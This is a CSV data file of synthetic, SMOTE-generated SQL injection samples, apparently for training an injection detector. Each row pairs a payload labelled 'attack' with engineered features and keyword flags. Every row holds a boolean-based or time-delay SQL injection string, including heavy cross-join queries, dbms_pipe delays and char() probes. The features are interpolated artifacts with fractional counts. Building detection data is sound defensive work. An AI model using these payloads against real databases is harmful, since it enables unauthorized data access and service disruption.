id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000224,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R002790,0.011235180480014527,42.0,19.04061304158686,3.5473117054171874,10.0,13.0,14.0,5.0,0.23809523809523808,0.30952380952380953,0.3333333333333333,0.11904761904761904,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000225,attack,boolean,"1%""   )    )     )   and 8438  =  7620--",nearest_attack_euclidean,R002565,0.412243682663636,40.0,14.895125613766728,2.807854679876641,3.0,9.0,20.0,8.0,0.07500000000000001,0.225,0.5,0.2,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.000000000000001,1.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000226,attack,boolean,"1'||  (  select 'nvrq' from dual where 4337  =  4337 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R003067,0.46451445500851607,215.42965931977542,34.30071370807806,3.958948381813324,124.38429842228278,19.39857258384389,50.79714516768778,20.84964314596097,0.5752191369680486,0.09026644226864636,0.23685356696251447,0.09766085380079056,3.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,5.39857258384389,7.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000227,attack,boolean,1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,nearest_attack_euclidean,R002555,0.022561504081841367,56.0,19.0,3.5265687818972475,14.0,13.0,20.0,9.0,0.25,0.23214285714285715,0.35714285714285715,0.16071428571428573,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000228,attack,boolean,"1%""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R002929,0.4212797366333563,217.9433321612759,29.837733286451034,3.4634752434497686,111.83773328645104,12.0,69.7546657290207,24.35093314580414,0.5140696846281892,0.05516714716386999,0.3191263672216001,0.11163680098634066,0.0,4.0,0.0,0.0,1.0,2.0,0.0,9.350933145804142,2.0,0.0,6.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.8377332864510354,0.16226671354896455,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000229,attack,boolean,-5880'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rwgl'  =  'rwgl,nearest_attack_euclidean,R002684,0.08553161866581166,374.62511630255835,31.272065664856374,3.2265834774751023,88.0,50.0,181.80891930798924,54.81619699456912,0.235361645587653,0.1337282077202574,0.48464640067125364,0.14626374602083597,4.0,-1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,37.816196994569125,0.0,0.0,0.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000230,attack,boolean,"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",nearest_attack_euclidean,R002122,0.04909971912943819,79.33420508086496,23.822454688230657,3.5767041062567855,12.733682032345982,24.0,31.64490937646131,10.955613672057662,0.1600672877954681,0.3030728996267771,0.39863426683254355,0.1382255457452113,0.0,1.0,3.0,0.0,1.0,2.0,0.0,3.9556136720576642,0.0,0.0,0.0,6.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000231,attack,boolean,"1%'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R002102,0.03654402019105666,161.3205493686851,30.0,3.785063399875951,74.3205493686851,8.0,57.0,22.0,0.46060883293809657,0.0495991877758072,0.3533942129026264,0.13639776638346982,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,8.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000232,attack,boolean,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""zwov""  =  ""zwov",nearest_attack_euclidean,R002154,0.31958093443482843,112.18241646280367,31.635167074392655,3.8938507949787184,43.72966585121469,13.0,40.635167074392655,14.817583537196327,0.38976601354578755,0.1158840538861846,0.36225186767991674,0.13209806488811107,0.0,4.0,0.0,0.0,1.0,1.8175835371963278,0.0,6.0,0.0,1.0,1.0,2.817583537196328,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000233,attack,boolean,"1  )   where 9724  =  9724 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003467,0.1102495323727228,202.12362336749192,35.53090584187298,3.8133135670673366,58.592717525618944,32.0,80.53090584187298,31.0,0.2897475233936718,0.15836644356346774,0.398468540840751,0.15341749220210937,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,17.0,0.0,1.0,3.0,10.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000234,attack,boolean,"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",nearest_attack_euclidean,R001095,0.43343379690663436,63.61780389090576,26.0,3.9549022421743047,15.691098054547123,20.078535927270504,19.30890194545288,8.539267963635252,0.2478890000474515,0.31502762804786494,0.30318710525067066,0.13389626665401294,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,1.769633981817626,0.0,0.7696339818176263,0.7696339818176263,4.230366018182374,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.23036601818237368,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2303660181823735
SMOTE_000235,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R002764,0.48731029499009165,84.39319975598721,19.985759967464965,2.941261839984649,10.971519934929923,13.0,43.94303986985985,16.478639951197444,0.12891985279301513,0.15526374974197715,0.5205937436109147,0.19522265385409301,0.0,4.0,0.0,0.0,0.0,2.0,0.0,6.985759967464963,2.0,0.49287998373248154,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000236,attack,boolean,"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- yekf",nearest_attack_euclidean,R001501,0.1970827246600869,134.0,31.0,4.224778479561899,74.33743005356575,9.0,35.246927459825685,15.415642486608562,0.554756940698252,0.06716417910447761,0.2630367720882514,0.1150421081090191,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.415642486608561,0.0,0.0,3.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000237,attack,boolean,1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,nearest_attack_euclidean,R002436,0.025249817988891518,76.0,15.0,2.702435066781465,6.0,21.0,40.0,9.0,0.07894736842105263,0.27631578947368424,0.5263157894736842,0.11842105263157894,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000238,attack,boolean,"1%'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002968,0.4445600570639444,183.73055423135332,31.730554231353313,3.664298965160712,53.0,25.0,74.0,31.730554231353313,0.288467588077283,0.13606961701758633,0.4027660663720556,0.17269672853307505,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,17.0,0.7305542313533129,1.0,3.0,9.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000239,attack,boolean,"1""  )   where 3958  =  3958 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003002,0.47371748470302816,128.7901272529808,36.79012725298078,3.857922767413446,36.0,23.0,52.0,17.79012725298078,0.2795273388379779,0.1785869109242637,0.403761711654857,0.13812403858290134,2.0,0.7901272529807819,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.7901272529807819,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000240,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R001377,0.46383828589048637,71.08178935584753,23.522719265513203,3.5599729822692647,15.513631559307921,19.018175412410564,28.036350824821128,8.513631559307923,0.2190927632450052,0.2682936404274288,0.3936070174593889,0.11900657886817712,0.0,1.0,2.0,0.0,0.0,2.0,0.0,3.009087706205282,0.0,0.0,0.5045438531026407,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000241,attack,boolean,"1%'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001997,0.17394689090135892,137.44428769631511,31.0,3.931683957969917,70.05500693710286,8.0,42.11142460736979,17.27785615184245,0.5095695994877188,0.058207891007538315,0.30648768117370584,0.12573482833103694,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.277856151842448,1.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000242,attack,boolean,"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'yqzg'  =  'yqzg",nearest_attack_euclidean,R003331,0.042098363200469585,152.86832310049255,32.0,4.051521108079181,82.53401539432046,8.0,44.46744616493767,17.866861541234417,0.5400117335000696,0.052377164432460876,0.2907342956620645,0.11687680640540499,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,5.866861541234417,0.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000243,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'aatp'  =  'aatp",nearest_attack_euclidean,R003029,0.015963198126739072,158.73913085257013,34.0,3.7939471400503035,59.0,10.0,62.7913046820561,26.947826170514027,0.37169775707336283,0.06299961984294286,0.3955424406083069,0.16976018247538743,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,12.947826170514023,0.0,2.0,1.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000244,attack,boolean,"1%""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001812,0.0004398048986693716,141.00801538405662,30.0,3.9659784564847085,68.00801538405662,8.0,45.0,20.0,0.4822975427945243,0.05673451585813433,0.3191316517020056,0.14183628964533582,0.0,4.0,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000245,attack,boolean,"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'xuwl' like 'xuwl",nearest_attack_euclidean,R000896,0.022913160493914862,219.5025303050037,35.0,3.688628979952018,67.0,24.0,93.58544192083639,34.91708838416728,0.30531842461884867,0.10936779389331891,0.42624210050820177,0.15907168097963062,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,19.91708838416728,0.0,1.0,3.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000246,attack,boolean,"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",nearest_attack_euclidean,R002977,0.02416344037789621,65.0,17.855701835162808,3.019297478291831,14.0,9.0,32.0,10.0,0.2153846153846154,0.13846153846153847,0.49230769230769234,0.15384615384615385,0.0,4.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000247,attack,boolean,-7950'  )   or 9323  =  9323#,nearest_attack_euclidean,R002940,0.05901218796556207,29.032551810714452,14.0,3.201927075988293,2.0,12.0,10.0,5.032551810714459,0.06889068549261046,0.4133441129556626,0.3444534274630522,0.17331177408867476,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,1.0,0.0325518107144592,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000248,attack,boolean,"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'uwbh'  =  'uwbh",nearest_attack_euclidean,R003055,0.31265036596318213,205.26856626899726,29.0,3.5688663767218416,119.0,12.0,55.22380522416439,19.044761044832878,0.5817206039490299,0.05866090123855766,0.2670926894333671,0.0925258053790452,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,6.044761044832876,0.0,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000249,attack,boolean,-7279  )   or 9898  =  9963 and   (  1481  =  1481,nearest_attack_euclidean,R001177,0.557627859456094,58.43429162924879,19.87428702872195,3.3235516314076663,6.405715271541467,21.87428702872195,23.748574057443903,6.405715271541464,0.10826891336200861,0.377949564367977,0.4055126089080057,0.10826891336200861,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,2.9371435143609768,0.0,0.0,0.46857175718048816,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000250,attack,boolean,"-3933%""   )    )    or elt  (  8142  =  2978,2978  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001436,0.44894507393055727,72.13849603709471,22.01731200463684,3.169889423798437,7.2629840034776265,15.017312004636839,35.08656002318419,14.771640005796048,0.10102363332850331,0.21228359994203952,0.47952733342993414,0.20716543329952306,0.0,4.0,1.0,0.0,0.0,2.0,0.0,5.017312004636839,2.0,0.0,0.7543280011592097,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000251,attack,boolean,"1'+  (  select llcl where 8188  =  8188 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000804,0.1681855966669117,211.4984118626798,33.2507940686601,3.7793641627911114,123.4984118626798,20.0,50.12539703433005,17.87460296566995,0.5839046680858995,0.09456712088956831,0.2370206725812768,0.08450753844325545,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,6.0,5.874602965669949,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.8746029656699488,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.874602965669949
SMOTE_000252,attack,boolean,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001358,0.2175622598634204,135.95657662755417,30.0,3.905479022772889,68.47466969940659,8.0,42.985525542518054,16.496381385629512,0.5034956435607711,0.05895706321666126,0.3161375232284738,0.12140976999409372,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.496381385629514,0.0,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000253,attack,boolean,hi'  )   or   (  'a'  =  'a,nearest_attack_euclidean,R000072,0.3076378328261828,27.91699897819224,9.73800029194507,2.3415968126127695,5.73800029194507,0.0,15.047998832219712,7.130999854027465,0.20852289108209524,0.0,0.5353572797115912,0.2561198292063135,3.869000145972536,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.261999708054928,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
